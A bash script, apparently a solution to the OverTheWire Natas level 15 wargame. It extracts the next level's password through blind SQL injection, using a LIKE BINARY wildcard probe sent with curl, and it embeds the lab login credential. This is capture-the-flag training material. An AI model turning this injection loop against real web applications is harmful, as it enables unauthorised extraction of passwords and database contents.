#!/bin/bash

PASSWORD=""
TMP_FILE="temp.log"

OPTS="-s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
DATA='username=natas16" and password like binary'
URL="natas15.natas.labs.overthewire.org"

SUCCESS="This user exists"

for i in {1..64}
do
	# Check all alphanumeric characters
	for c in {{a..z},{A..Z},{0..9}}
	do
		curl $OPTS --data-urlencode "$DATA \"$PASSWORD$c%" $URL > $TMP_FILE

		# If we found the valid character, add it to the password and start over
		if grep -q "$SUCCESS" $TMP_FILE
		then
			PASSWORD=$PASSWORD$c
			break
		fi

		# If this was the last character (and haven't broken); we're done
		if [[ $c =~ ^[0-9]+$ ]] && [[ $c -eq 9 ]]; then
			break 2 # Break out of both loops
		fi
	done
done

rm $TMP_FILE
echo "Password: $PASSWORD"
exit 0
